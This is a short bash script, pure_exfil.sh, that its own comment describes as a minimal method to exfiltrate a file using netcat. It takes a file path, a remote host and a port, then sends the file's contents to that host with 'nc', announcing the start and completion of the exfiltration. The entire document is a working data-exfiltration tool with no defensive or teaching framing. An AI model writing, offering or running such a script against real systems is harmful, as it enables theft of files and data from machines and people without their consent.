#!/bin/bash
# pure_exfil.sh - A minimal method to exfiltrate a file using netcat.
if [ "$#" -ne 3 ]; then
  echo "Usage: $0 <file> <remote_host> <remote_port>"
  exit 1
fi
echo "Exfiltrating $1 using netcat..."
nc "$2" "$3" < "$1"
echo "Exfiltration complete."
